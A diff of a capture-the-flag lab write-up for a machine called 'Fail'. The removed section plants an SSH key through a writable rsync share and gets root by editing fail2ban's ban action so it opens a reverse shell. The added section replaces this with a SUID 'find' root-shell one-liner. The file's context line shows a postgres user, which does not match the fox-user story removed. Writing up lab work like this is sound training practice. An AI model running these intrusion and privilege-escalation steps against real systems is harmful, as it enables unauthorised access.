@@ -137,141 +137,21 @@ whoami
 postgres
 ~~~
 
-The contents of the fox folder can be retrieved and stored locally using the command
-~~~shell
-rsync -av rsync://192.168.194.126/fox ./rsyn_shared
-~~~
-These files reveal no useful information to further our progress.
-
-Rsync also allows us to upload files, therefore we can generate a SSH key (as we have seen SSH TCP port 22 is enabled), then upload to the key to the machine using Rsync to
-give us a remote connection to the machine.
-
-# Exploitation
-
-Generate SSH Key
-~~~shell
-┌──(kali㉿kali)-[~/Desktop/Fail]
-└─$ ssh-keygen                                       
-Generating public/private rsa key pair.
-Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
-Enter passphrase (empty for no passphrase): 
-Enter same passphrase again: 
-Your identification has been saved in /home/kali/.ssh/id_rsa
-Your public key has been saved in /home/kali/.ssh/id_rsa.pub
-The key fingerprint is:
-SHA256:LvQfnvR+8TxNBfJBl+4vlOWFvrQu5HBkN6lzYPVXszk kali@kali
-The key's randomart image is:
-+---[RSA 3072]----+
-|             .. o|
-|            . ++.|
-|             +.*=|
-|            = *E*|
-|      . S  + =.==|
-|     . o  . = B.o|
-|      . o o= = Bo|
-|       . + +o =.=|
-|          +.o+...|
-+----[SHA256]-----+
-~~~
-
-Copy our .ssh directory locally
-~~~shell
-cp -R /home/kali/.ssh .
-~~~
-
-Rename id_rsa.pub (our public key) to authorized_keys before transferring to the target
-~~~shell
-┌──(kali㉿kali)-[~/Desktop/Fail]
-└─$ cd .ssh
-┌──(kali㉿kali)-[~/Desktop/Fail/.ssh]
-└─$ mv id_rsa.pub authorized_keys
-~~~
-
-Upload the .ssh file (containing authorized_keys) to Rsync
-~~~shell
-rsync -av /home/kali/Desktop/Fail/.ssh rsync://fox@192.168.194.126/fox
-~~~
-
-SSH into the target machine
-~~~shell
-┌──(kali㉿kali)-[~/Desktop/Fail/.ssh]
-└─$ ssh -i ./id_rsa fox@192.168.194.126
-The authenticity of host '192.168.194.126 (192.168.194.126)' can't be established.
-ED25519 key fingerprint is SHA256:mqPCrimr9j626KOGoHM+qxgHUOYD4pu1+4KzhIvu5uA.
-This host key is known by the following other names/addresses:
-    ~/.ssh/known_hosts:37: [hashed name]
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '192.168.194.126' (ED25519) to the list of known hosts.
-Linux fail 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-$ id
-uid=1000(fox) gid=1001(fox) groups=1001(fox),1000(fail2ban)
-$ 
-~~~
-
-# Privilege Escalation
-
-After running Linpeas.sh a directory /etc/fail2ban was identified which is writable by our user
+I ran a scan using linpeas.sh which identified the "find" binary has the SUID bit set, which can be used to elevate privileges through the -exec option of the find cmdlet as discussed in GTFOBins(https://gtfobins.github.io/gtfobins/find/#suid) list of binaries and bypasses
 
 ~~~shell
-╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
-╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                            
-  Group fail2ban:                                                                                                                                                            
-/etc/fail2ban/action.d                                                                                                                                                       
-/etc/fail2ban/action.d/firewallcmd-ipset.conf
-/etc/fail2ban/action.d/nftables-multiport.conf
-/etc/fail2ban/action.d/firewallcmd-multiport.conf
-/etc/fail2ban/action.d/mail-whois.conf
-/etc/fail2ban/action.d/ufw.conf
-You_can_write_even_more_files_inside_last_directory
+                      ╔════════════════════════════════════╗
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                           
+                      ╚════════════════════════════════════╝                                                                                                                 
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                             
+strings Not Found                                                                                                                                                            
+strace Not Found                              
+-rwsr-xr-x 1 root root 309K Feb 16  2019 /usr/bin/find
 ~~~
-
-A manual verification of this vulnerability was ran which identified full Read, Write, Execute (RWX) permissions over a file named action.d which is ran by Root
 
 ~~~shell
-$ find /etc -writable -ls 2>/dev/null
-   787482      4 drwxrwxr-x   2 root     fail2ban     4096 Dec  3  2020 /etc/fail2ban/action.d
+$ find . -exec /bin/sh -p \; -quit
+# whoami
+root
 ~~~
-
-After researching exploits for Fail2Ban an exploit I discovered an exploit within /etc/fail2ban/jail.conf [Exploit](https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49)
-
-Inspecting /etc/fail2ban/jail.conf shows that Fail2Ban is configured to only allow 2 attempts before performing the banaction (maxretry) as shown below
-
-![Fail](/assets/img/FailPG(1).png)
-
-Further down it shows the banaction executes iptables-multiport, we have read-write permissions over iptables-multiport.conf as shown below
-
-![Fail](/assets/img/FailPG(2).png)
-
-![Fail](/assets/img/FailPG(3).png)
-
-We then change the iptables-multiport.conf file's actionban= to include a reverse shell
-
-Before
-
-![Fail](/assets/img/FailPG(4).png)
-
-After
-
-![Fail](/assets/img/FailPG(5).png)
-
-Start a listener on port 80
-
-Attempt to log in with invalid credentials to execute the Fail2Ban and execute our reverse shell
-~~~shell
-┌──(kali㉿kali)-[~]
-└─$ ssh root@192.168.194.126                    
-root@192.168.194.126's password: 
-Permission denied, please try again.
-root@192.168.194.126's password: 
-Permission denied, please try again.
-root@192.168.194.126's password: 
-root@192.168.194.126: Permission denied (publickey,password).
-~~~
-We then recieve our root shell on the netcat listener on port 80
-
-![Fail](/assets/img/FailPG(6).png)
